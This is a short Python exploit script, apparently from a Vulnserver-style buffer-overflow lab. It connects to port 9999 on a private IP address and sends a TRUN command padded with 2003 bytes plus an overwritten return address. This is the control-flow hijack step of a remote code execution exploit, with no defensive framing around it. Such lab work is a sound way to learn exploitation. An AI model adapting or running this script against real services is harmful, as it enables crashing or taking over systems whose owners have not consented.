#!/usr/bin/python

import sys
import socket

shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62"
data = b"TRUN /.:/" + shellcode

ip = "192.168.1.11"
port = 9999

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.send((data))
    s.close()

except socket.error:
    print("Error connecting to server")
    sys.exit()
